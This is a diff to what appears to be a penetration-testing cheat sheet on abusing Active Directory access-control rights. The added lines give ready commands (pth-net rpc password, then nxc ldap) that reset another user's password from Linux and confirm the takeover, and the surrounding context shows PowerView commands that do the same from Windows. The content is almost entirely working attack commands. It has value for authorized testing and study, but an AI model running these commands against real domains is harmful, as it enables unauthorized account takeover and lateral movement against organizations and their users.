@@ -58,6 +58,20 @@ $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 ```
 
+From Linux, `pth-net rpc password` can reset a target user's password when your controlled principal has `ForceChangePassword`, `GenericAll`, or equivalent rights:
+
+```bash
+pth-net rpc password "TARGET.USER" "NewP@ssword2022" \
+  -U "DOMAIN"/"CONTROLLED.USER"%"CONTROLLED_PASSWORD" \
+  -S DC_IP
+```
+
+Verify the new credential:
+
+```bash
+nxc ldap DOMAIN -d DOMAIN -u "TARGET.USER" -p 'NewP@ssword2022' -t 1
+```
+
 ### 2. GenericWrite - Add user to group
 ```powershell
 $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
